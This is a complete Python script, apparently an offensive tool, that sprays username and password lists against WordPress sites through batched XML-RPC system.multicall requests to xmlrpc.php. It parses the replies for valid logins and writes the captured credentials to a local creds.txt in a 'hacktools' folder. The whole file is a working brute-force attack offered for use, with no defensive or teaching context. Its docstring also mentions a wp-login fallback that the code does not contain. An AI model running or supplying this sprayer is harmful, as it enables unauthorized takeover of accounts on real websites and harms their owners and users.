#!/usr/bin/env python3
"""XML-RPC multicall credential sprayer (wp.getUsersBlogs) + wp-login fallback."""
import sys, json, time, base64, urllib3, concurrent.futures
import requests

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/203.0.113.10 Safari/537.36"}

def esc(s):
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))

def multicall(userlist, batch=11):
    # build one XML-RPC multicall doc trying up to `batch` creds
    calls = []
    for u, p in userlist:
        calls.append(
            '<value><struct>'
            '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
            '<member><name>params</name><value><array><data>'
            f'<value><array><data><value><string>{esc(u)}</string></value>'
            f'<value><string>{esc(p)}</string></value></data></array></value>'
            '</data></array></value></member>'
            '</struct></value>')
    return ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>' + "".join(calls[:batch]) +
            '</data></array></value></param></params></methodCall>')

def try_batch(base, creds, timeout=15):
    body = multicall(creds)
    try:
        r = requests.post(base + "/xmlrpc.php", data=body,
                          headers={**UA, "Content-Type": "text/xml"}, timeout=timeout, verify=False)
    except Exception as e:
        return None, str(e)
    return r, None

def parse_multi(text, creds):
    """Parse multicall XML; per-index struct with faultCode = failure."""
    import xml.etree.ElementTree as ET
    hits = []
    try:
        root = ET.fromstring(text.encode("utf-8", "replace") if isinstance(text, str) else text)
    except Exception:
        return hits
    # find the first <data> under the params/value/array
    datas = root.findall(".//params/param/value/array/data")
    if not datas:
        return hits
    entries = list(datas[0])
    for i, entry in enumerate(entries):
        if i >= len(creds):
            break
        is_fault = any(m.findtext("name") == "faultCode" for m in entry.iter("member"))
        if not is_fault:
            hits.append(creds[i])
    return hits

def spray(base, users, passes, batch=20, timeout=15, delay=0.0, maxreq=None):
    pairs = [(u, p) for u in users for p in passes]
    hits = []
    reqs = 0
    for i in range(0, len(pairs), batch):
        chunk = pairs[i:i + batch]
        r, err = try_batch(base, chunk, timeout)
        reqs += 1
        if err:
            print(f"[!] {base} err {err[:80]}")
            continue
        if r is None:
            continue
        if r.status_code == 405:
            print(f"[-] {base} xmlrpc disabled (405)")
            break
        if r.status_code == 200 and "faultCode" in r.text or "isAdmin" in r.text:
            found = parse_multi(r.text, chunk)
            for u, p in found:
                print(f"[+] {base} VALID {u}:{p}")
                hits.append((u, p))
        if maxreq and reqs >= maxreq:
            print(f"[*] {base} stop after {reqs} req")
            break
        if delay:
            time.sleep(delay)
    return hits

def main():
    # args: targets_file(url|user1,user2) passlist [batch] [timeout]
    tfile, pfile = sys.argv[1], sys.argv[2]
    batch = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    tmo = int(sys.argv[4]) if len(sys.argv) > 4 else 15
    passes = [l.strip() for l in open(pfile, errors="ignore") if l.strip()]
    print(f"[*] {len(passes)} password")
    for line in open(tfile):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        url, _, us = line.partition("|")
        users = [u.strip() for u in us.split(",") if u.strip()]
        if not users:
            print(f"[-] {url} tanpa user")
            continue
        base = url.rstrip("/")
        total = len(users) * len(passes)
        print(f"[*] {base} users={users} pairs={total}")
        hits = spray(base, users, passes, batch, tmo)
        if hits:
            with open("$HOME/hacktools/cpanel/wp_full/creds.txt", "a") as f:
                for u, p in hits:
                    f.write(f"{base}|{u}|{p}\n")
        else:
            print(f"[-] {base} tidak ada hit")

if __name__ == "__main__":
    main()
